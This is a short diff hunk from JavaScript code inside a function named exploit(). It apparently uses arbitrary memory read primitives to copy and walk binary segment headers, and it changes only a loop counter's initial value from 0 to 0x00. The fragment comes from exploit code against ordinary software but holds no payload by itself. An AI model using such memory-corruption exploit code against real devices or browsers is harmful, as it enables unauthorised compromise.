@@ -575,7 +575,7 @@ function exploit(){
         //log(memory.u32(Add(hdr,0x10)))
         var segdata  = memory.copyfrom(Add(hdr, memory.u32(Add(hdr, 0x10))),0, nsegs * 0x20);
         var segs     = [];
-        for(var i = 0; i < nsegs; ++i)
+        for(var i = 0x00; i < nsegs; ++i)
         {
             var off = i * 0x20;
             log(off)
